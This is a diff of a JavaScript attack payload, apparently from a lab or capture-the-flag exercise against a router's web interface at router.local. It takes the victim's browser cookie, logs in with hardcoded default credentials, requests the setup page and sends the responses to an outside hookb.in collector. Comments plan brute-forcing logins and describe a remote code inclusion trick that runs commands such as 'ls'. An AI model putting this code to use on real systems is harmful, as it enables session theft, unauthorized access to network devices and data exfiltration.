@@ -1,25 +1,36 @@
 //figure out how to login more automatically (e.g. for loops with all usernames/passwords + sending requests with each of them
 
 const http = new XMLHttpRequest();
-//http.open('POST', 'http://router.local/login.php', true);
+http.open('POST', 'http://router.local/login.php', true);
 //'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
 //http://router.local/view.php
 const cook = document.cookie;
 //http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true); -> how to run own php code (e.g. ls)
-http.open('POST', 'http://router.local/setup.php', true);
+//http.open('POST', 'http://router.local/setup.php', true);
 
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/G9Bj2gXPbjsE2xPPN3Po', true);
+                xhr.open('POST', 'https://hookb.in/LgYM1JmZXQf18VqqgpMy', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
-                xhr.send(JSON.stringify(http.responseText));
+                xhr.send(JSON.stringify(http.responseURL));
+  
+                const req = new XMLHttpRequest();
+                req.open('POST', 'http://router.local/setup.php', true);
+                req.onload = function () {
+                  const r = new XMLHttpRequest();
+                  r.open('POST', 'https://hookb.in/LgYM1JmZXQf18VqqgpMy', true);
+                  r.setRequestHeader('Content-type', 'application/json');
+                  r.send(JSON.stringify(http.responseText));
+                };
+                req.send();
+                
 
 };
 
-http.send();
-//http.send(cook+"&username=admin&pin=123456&notRobot=on");
+//http.send();
+http.send(cook+"&username=admin&pin=123456&notRobot=on");
 
 
 
